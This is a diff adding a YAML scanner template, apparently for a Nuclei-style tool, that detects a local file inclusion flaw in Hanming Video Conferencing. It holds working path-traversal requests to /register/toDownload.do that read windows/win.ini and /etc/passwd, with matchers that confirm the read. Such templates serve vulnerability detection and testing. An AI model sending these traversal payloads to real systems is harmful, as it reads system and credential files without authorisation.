@@ -1,0 +1,28 @@
+id: hanming-lfr
+name: Hanming Video Conferencing - Local File Inclusion
+severity: high
+confidence: tentative
+description: Hanming Video Conferencing is vulnerable to local file inclusion.
+reference: CWE-22
+tags:
+- lfr
+- hanming
+- lfi
+- vuln
+requests:
+- method: GET
+  path: /register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini
+  matchers: &id001
+  - type: body
+    words:
+    - bit app support
+    - fonts
+    - extensions
+  - type: regex
+    regex:
+    - 'root:[x*]:0:0:'
+  condition: or
+- method: GET
+  path: /register/toDownload.do?fileName=../../../../../../../../../../../../../../etc/passwd
+  matchers: *id001
+  condition: or
